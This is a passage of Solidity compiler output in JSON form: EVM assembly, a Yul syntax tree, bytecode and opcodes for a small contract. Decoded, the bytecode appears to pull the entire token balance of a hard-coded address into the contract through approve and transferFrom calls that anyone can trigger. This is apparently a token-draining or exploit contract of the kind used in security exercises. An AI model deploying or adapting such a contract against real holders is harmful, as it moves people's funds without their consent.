0x00\n        /* \"#utility.yul\":499:560   */\n      tag_50\n        /* \"#utility.yul\":552:559   */\n      dup5\n        /* \"#utility.yul\":543:549   */\n      dup3\n        /* \"#utility.yul\":532:541   */\n      dup6\n        /* \"#utility.yul\":528:550   */\n      add\n        /* \"#utility.yul\":499:560   */\n      tag_40\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":489:560   */\n      swap2\n      pop\n        /* \"#utility.yul\":445:570   */\n      pop\n        /* \"#utility.yul\":373:577   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":583:867   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":702:704   */\n      0x20\n        /* \"#utility.yul\":690:699   */\n      dup3\n        /* \"#utility.yul\":681:688   */\n      dup5\n        /* \"#utility.yul\":677:700   */\n      sub\n        /* \"#utility.yul\":673:705   */\n      slt\n        /* \"#utility.yul\":670:672   */\n      iszero\n      tag_52\n      jumpi\n        /* \"#utility.yul\":718:719   */\n      0x00\n        /* \"#utility.yul\":715:716   */\n      dup1\n        /* \"#utility.yul\":708:720   */\n      revert\n        /* \"#utility.yul\":670:672   */\n    tag_52:\n        /* \"#utility.yul\":761:762   */\n      0x00\n        /* \"#utility.yul\":786:850   */\n      tag_53\n        /* \"#utility.yul\":842:849   */\n      dup5\n        /* \"#utility.yul\":833:839   */\n      dup3\n        /* \"#utility.yul\":822:831   */\n      dup6\n        /* \"#utility.yul\":818:840   */\n      add\n        /* \"#utility.yul\":786:850   */\n      tag_44\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":776:850   */\n      swap2\n      pop\n        /* \"#utility.yul\":732:860   */\n      pop\n        /* \"#utility.yul\":660:867   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":873:991   */\n    tag_54:\n        /* \"#utility.yul\":960:984   */\n      tag_56\n        /* \"#utility.yul\":978:983   */\n      dup2\n        /* \"#utility.yul\":960:984   */\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":955:958   */\n      dup3\n        /* \"#utility.yul\":948:985   */\n      mstore\n        /* \"#utility.yul\":938:991   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":997:1154   */\n    tag_58:\n        /* \"#utility.yul\":1097:1147   */\n      tag_60\n        /* \"#utility.yul\":1141:1146   */\n      dup2\n        /* \"#utility.yul\":1097:1147   */\n      tag_61\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1092:1095   */\n      dup3\n        /* \"#utility.yul\":1085:1148   */\n      mstore\n        /* \"#utility.yul\":1075:1154   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1160:1278   */\n    tag_62:\n        /* \"#utility.yul\":1247:1271   */\n      tag_64\n        /* \"#utility.yul\":1265:1270   */\n      dup2\n        /* \"#utility.yul\":1247:1271   */\n      tag_65\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1242:1245   */\n      dup3\n        /* \"#utility.yul\":1235:1272   */\n      mstore\n        /* \"#utility.yul\":1225:1278   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1284:1506   */\n    tag_33:\n      0x00\n        /* \"#utility.yul\":1415:1417   */\n      0x20\n        /* \"#utility.yul\":1404:1413   */\n      dup3\n        /* \"#utility.yul\":1400:1418   */\n      add\n        /* \"#utility.yul\":1392:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1428:1499   */\n      tag_67\n        /* \"#utility.yul\":1496:1497   */\n      0x00\n        /* \"#utility.yul\":1485:1494   */\n      dup4\n        /* \"#utility.yul\":1481:1498   */\n      add\n        /* \"#utility.yul\":1472:1478   */\n      dup5\n        /* \"#utility.yul\":1428:1499   */\n      tag_54\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1382:1506   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1512:1954   */\n    tag_26:\n      0x00\n        /* \"#utility.yul\":1699:1701   */\n      0x60\n        /* \"#utility.yul\":1688:1697   */\n      dup3\n        /* \"#utility.yul\":1684:1702   */\n      add\n        /* \"#utility.yul\":1676:1702   */\n      swap1\n      pop\n        /* \"#utility.yul\":1712:1783   */\n      tag_69\n        /* \"#utility.yul\":1780:1781   */\n      0x00\n        /* \"#utility.yul\":1769:1778   */\n      dup4\n        /* \"#utility.yul\":1765:1782   */\n      add\n        /* \"#utility.yul\":1756:1762   */\n      dup7\n        /* \"#utility.yul\":1712:1783   */\n      tag_54\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1793:1865   */\n      tag_70\n        /* \"#utility.yul\":1861:1863   */\n      0x20\n        /* \"#utility.yul\":1850:1859   */\n      dup4\n        /* \"#utility.yul\":1846:1864   */\n      add\n        /* \"#utility.yul\":1837:1843   */\n      dup6\n        /* \"#utility.yul\":1793:1865   */\n      tag_54\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1875:1947   */\n      tag_71\n        /* \"#utility.yul\":1943:1945   */\n      0x40\n        /* \"#utility.yul\":1932:1941   */\n      dup4\n        /* \"#utility.yul\":1928:1946   */\n      add\n        /* \"#utility.yul\":1919:1925   */\n      dup5\n        /* \"#utility.yul\":1875:1947   */\n      tag_62\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":1666:1954   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1960:2292   */\n    tag_19:\n      0x00\n        /* \"#utility.yul\":2119:2121   */\n      0x40\n        /* \"#utility.yul\":2108:2117   */\n      dup3\n        /* \"#utility.yul\":2104:2122   */\n      add\n        /* \"#utility.yul\":2096:2122   */\n      swap1\n      pop\n        /* \"#utility.yul\":2132:2203   */\n      tag_73\n        /* \"#utility.yul\":2200:2201   */\n      0x00\n        /* \"#utility.yul\":2189:2198   */\n      dup4\n        /* \"#utility.yul\":2185:2202   */\n      add\n        /* \"#utility.yul\":2176:2182   */\n      dup6\n        /* \"#utility.yul\":2132:2203   */\n      tag_54\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2213:2285   */\n      tag_74\n        /* \"#utility.yul\":2281:2283   */\n      0x20\n        /* \"#utility.yul\":2270:2279   */\n      dup4\n        /* \"#utility.yul\":2266:2284   */\n      add\n        /* \"#utility.yul\":2257:2263   */\n      dup5\n        /* \"#utility.yul\":2213:2285   */\n      tag_62\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2086:2292   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2298:2546   */\n    tag_9:\n      0x00\n        /* \"#utility.yul\":2442:2444   */\n      0x20\n        /* \"#utility.yul\":2431:2440   */\n      dup3\n        /* \"#utility.yul\":2427:2445   */\n      add\n        /* \"#utility.yul\":2419:2445   */\n      swap1\n      pop\n        /* \"#utility.yul\":2455:2539   */\n      tag_76\n        /* \"#utility.yul\":2536:2537   */\n      0x00\n        /* \"#utility.yul\":2525:2534   */\n      dup4\n        /* \"#utility.yul\":2521:2538   */\n      add\n        /* \"#utility.yul\":2512:2518   */\n      dup5\n        /* \"#utility.yul\":2455:2539   */\n      tag_58\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2409:2546   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2552:2774   */\n    tag_15:\n      0x00\n        /* \"#utility.yul\":2683:2685   */\n      0x20\n        /* \"#utility.yul\":2672:2681   */\n      dup3\n        /* \"#utility.yul\":2668:2686   */\n      add\n        /* \"#utility.yul\":2660:2686   */\n      swap1\n      pop\n        /* \"#utility.yul\":2696:2767   */\n      tag_78\n        /* \"#utility.yul\":2764:2765   */\n      0x00\n        /* \"#utility.yul\":2753:2762   */\n      dup4\n        /* \"#utility.yul\":2749:2766   */\n      add\n        /* \"#utility.yul\":2740:2746   */\n      dup5\n        /* \"#utility.yul\":2696:2767   */\n      tag_62\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2650:2774   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2780:2876   */\n    tag_57:\n      0x00\n        /* \"#utility.yul\":2846:2870   */\n      tag_80\n        /* \"#utility.yul\":2864:2869   */\n      dup3\n        /* \"#utility.yul\":2846:2870   */\n      tag_81\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2835:2870   */\n      swap1\n      pop\n        /* \"#utility.yul\":2825:2876   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2882:2972   */\n    tag_82:\n      0x00\n        /* \"#utility.yul\":2959:2964   */\n      dup2\n        /* \"#utility.yul\":2952:2965   */\n      iszero\n        /* \"#utility.yul\":2945:2966   */\n      iszero\n        /* \"#utility.yul\":2934:2966   */\n      swap1\n      pop\n        /* \"#utility.yul\":2924:2972   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2978:3104   */\n    tag_81:\n      0x00\n        /* \"#utility.yul\":3055:3097   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3048:3053   */\n      dup3\n        /* \"#utility.yul\":3044:3098   */\n      and\n        /* \"#utility.yul\":3033:3098   */\n      swap1\n      pop\n        /* \"#utility.yul\":3023:3104   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3110:3187   */\n    tag_65:\n      0x00\n        /* \"#utility.yul\":3176:3181   */\n      dup2\n        /* \"#utility.yul\":3165:3181   */\n      swap1\n      pop\n        /* \"#utility.yul\":3155:3187   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3193:3345   */\n    tag_61:\n      0x00\n        /* \"#utility.yul\":3289:3339   */\n      tag_87\n        /* \"#utility.yul\":3333:3338   */\n      dup3\n        /* \"#utility.yul\":3289:3339   */\n      tag_88\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":3276:3339   */\n      swap1\n      pop\n        /* \"#utility.yul\":3266:3345   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3351:3477   */\n    tag_88:\n      0x00\n        /* \"#utility.yul\":3447:3471   */\n      tag_90\n        /* \"#utility.yul\":3465:3470   */\n      dup3\n        /* \"#utility.yul\":3447:3471   */\n      tag_81\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":3434:3471   */\n      swap1\n      pop\n        /* \"#utility.yul\":3424:3477   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3483:3599   */\n    tag_43:\n        /* \"#utility.yul\":3553:3574   */\n      tag_92\n        /* \"#utility.yul\":3568:3573   */\n      dup2\n        /* \"#utility.yul\":3553:3574   */\n      tag_82\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":3546:3551   */\n      dup2\n        /* \"#utility.yul\":3543:3575   */\n      eq\n        /* \"#utility.yul\":3533:3535   */\n      tag_93\n      jumpi\n        /* \"#utility.yul\":3589:3590   */\n      0x00\n        /* \"#utility.yul\":3586:3587   */\n      dup1\n        /* \"#utility.yul\":3579:3591   */\n      revert\n        /* \"#utility.yul\":3533:3535   */\n    tag_93:\n        /* \"#utility.yul\":3523:3599   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3605:3727   */\n    tag_47:\n        /* \"#utility.yul\":3678:3702   */\n      tag_95\n        /* \"#utility.yul\":3696:3701   */\n      dup2\n        /* \"#utility.yul\":3678:3702   */\n      tag_65\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":3671:3676   */\n      dup2\n        /* \"#utility.yul\":3668:3703   */\n      eq\n        /* \"#utility.yul\":3658:3660   */\n      tag_96\n      jumpi\n        /* \"#utility.yul\":3717:3718   */\n      0x00\n        /* \"#utility.yul\":3714:3715   */\n      dup1\n        /* \"#utility.yul\":3707:3719   */\n      revert\n        /* \"#utility.yul\":3658:3660   */\n    tag_96:\n        /* \"#utility.yul\":3648:3727   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207a32175784b7f2aadd0f0d263ef2c80870a1533cb03323e173aefa95659d981f64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:805:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:2"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:2",
														"type": ""
													}
												],
												"src": "7:143:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:207:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "288:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "291:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "281:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "250:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:2"
															},
															"nodeType": "YulIf",
															"src": "243:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "305:128:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "320:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "334:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "324:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "349:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "395:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "406:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "391:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "391:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "415:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "359:31:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "359:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "349:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:2",
														"type": ""
													}
												],
												"src": "156:284:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "491:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "501:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "530:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "512:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "512:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "501:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "473:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "483:7:2",
														"type": ""
													}
												],
												"src": "446:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "593:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "603:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "618:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "625:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "614:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "614:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "603:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "575:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "585:7:2",
														"type": ""
													}
												],
												"src": "548:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "723:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "780:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "789:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "792:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "782:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "782:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "782:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "746:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "771:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "753:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "753:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "743:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "743:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "736:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "736:43:2"
															},
															"nodeType": "YulIf",
															"src": "733:2:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "716:5:2",
														"type": ""
													}
												],
												"src": "680:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405273db01d94217308046a792d864b16a35837aa52b86600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006557600080fd5b506040516106a33803806106a3833981810160405281019061008791906100e2565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610154565b6000815190506100dc8161013d565b92915050565b6000602082840312156100f457600080fd5b6000610102848285016100cd565b91505092915050565b60006101168261011d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101468161010b565b811461015157600080fd5b50565b610540806101636000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806314f719d0146100465780637ca2474e14610064578063b69ef8a81461006e575b600080fd5b61004e61008c565b60405161005b919061043a565b60405180910390f35b61006c6100b0565b005b61007661023f565b6040516100839190610455565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006100ba61023f565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b330836040518363ffffffff1660e01b8152600401610117929190610411565b602060405180830381600087803b15801561013157600080fd5b505af1158015610145573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101699190610340565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630846040518463ffffffff1660e01b81526004016101e9939291906103da565b602060405180830381600087803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061023b9190610340565b5050565b60008060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016102bd91906103bf565b60206040518083038186803b1580156102d557600080fd5b505afa1580156102e9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030d9190610369565b90508091505090565b600081519050610325816104dc565b92915050565b60008151905061033a816104f3565b92915050565b60006020828403121561035257600080fd5b600061036084828501610316565b91505092915050565b60006020828403121561037b57600080fd5b60006103898482850161032b565b91505092915050565b61039b81610470565b82525050565b6103aa816104b8565b82525050565b6103b9816104ae565b82525050565b60006020820190506103d46000830184610392565b92915050565b60006060820190506103ef6000830186610392565b6103fc6020830185610392565b61040960408301846103b0565b949350505050565b60006040820190506104266000830185610392565b61043360208301846103b0565b9392505050565b600060208201905061044f60008301846103a1565b92915050565b600060208201905061046a60008301846103b0565b92915050565b600061047b8261048e565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006104c3826104ca565b9050919050565b60006104d58261048e565b9050919050565b6104e581610482565b81146104f057600080fd5b50565b6104fc816104ae565b811461050757600080fd5b5056fea26469706673582212207a32175784b7f2aadd0f0d263ef2c80870a1533cb03323e173aefa95659d981f64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xDB01D94217308046A792D864B16A35837AA52B86 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x6A3 CODESIZE SUB DUP1 PUSH2 0x6A3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x87 SWAP2 SWAP1 PUSH2 0xE2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x154 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xDC DUP2 PUSH2 0x13D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x102 DUP5 DUP3 DUP6 ADD PUSH2 0xCD JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x116 DUP3 PUSH2 0x11D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x146 DUP2 PUSH2 0x10B JUMP JUMPDEST DUP2 EQ PUSH2 0x151 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x540 DUP1 PUSH2 0x163 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x14F719D0 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x7CA2474E EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xB69EF8A8 EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x43A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6C PUSH2 0xB0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x23F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x455 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBA PUSH2 0x23F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x117 SWAP3 SWAP2 SWAP1 PUSH2 0x411 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 